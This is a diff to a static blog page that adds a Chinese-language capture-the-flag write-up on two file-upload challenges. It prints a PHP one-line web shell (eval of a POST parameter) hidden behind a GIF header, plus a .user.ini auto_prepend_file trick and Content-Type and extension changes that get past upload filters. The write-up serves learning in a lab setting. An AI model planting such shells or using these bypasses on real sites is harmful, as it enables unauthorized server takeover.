@@ -69,6 +69,67 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web7" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/31/web7/" class="article-date">
+  <time class="dt-published" datetime="2025-01-31T14:52:04.000Z" itemprop="datePublished">2025-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/31/web7/">web7</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a href="">1.做题</a></p>
+<p><a href="">2.总结</a></p>
+<p><strong>1.1攻防世界easyupload</strong>:</p>
+<p>​     打开靶机，上传一句话木马，经过多次多种尝试后，结果都为上传失败，看了题解后得知，可以上传.user.ini文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=muma.jpg</span><br></pre></td></tr></table></figure>
+
+<p>​      上传后打开bp,修改content-type为image&#x2F;jpg，发现上传成功。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250131-215518-1738336920184-5.png"></p>
+<p>​     然后就可以上传图片马了，muma.jpg如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span>                 ```</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250131-221343-1738337075493-7.png"></p>
+<p>​      连接蚁剑，输入url和密码，连接成功。得到flag。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250131-221615.png"></p>
+<p><strong>1.2攻防世界upload1</strong>:</p>
+<p>​     打开靶机，提示“选择一张图片文件上传”，上传后到bp修改后缀为.php。<img src="/imgs/$%7Bfiilename%7D/QQ20250131-224426.png"></p>
+<p>​     连接蚁剑，找到flag。     <img src="/imgs/$%7Bfiilename%7D/QQ20250131-224759.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250131-224854.png"></p>
+<p><strong>2.1总结</strong>:  关于.user.ini在文件上传漏洞中的使用</p>
+<p>​     .user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p>
+<p>​    假如网站限制不允许上传.php文件，这是就可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n</a></p>
+<p>​            <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/126962920">文件上传-.user.ini的妙用-CSDN博客</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://qin456486.github.io/2025/01/31/web7/" data-id="cm6kxjeq300005ov32keihyxd" data-title="web7" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/25/web6/" class="article-date">
@@ -513,6 +574,10 @@
       <ul>
         
           <li>
+            <a href="/2025/01/31/web7/">web7</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/25/web6/">web6</a>
           </li>
         
@@ -526,10 +591,6 @@
         
           <li>
             <a href="/2025/01/18/web3/">web3</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/18/web2/">web2</a>
           </li>
         
       </ul>
